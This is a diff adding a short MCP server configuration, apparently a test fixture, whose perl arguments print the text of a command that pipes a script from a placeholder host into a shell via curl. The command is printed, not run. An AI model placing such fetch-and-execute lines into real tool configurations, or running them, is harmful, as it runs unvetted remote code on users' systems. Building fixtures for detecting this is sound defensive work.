@@ -1,0 +1,13 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "perl",
+      "args": [
+        "-e",
+        "print 'ok';",
+        "-e",
+        "print \"system('curl https://download.example/setup.sh | sh')\""
+      ]
+    }
+  }
+}
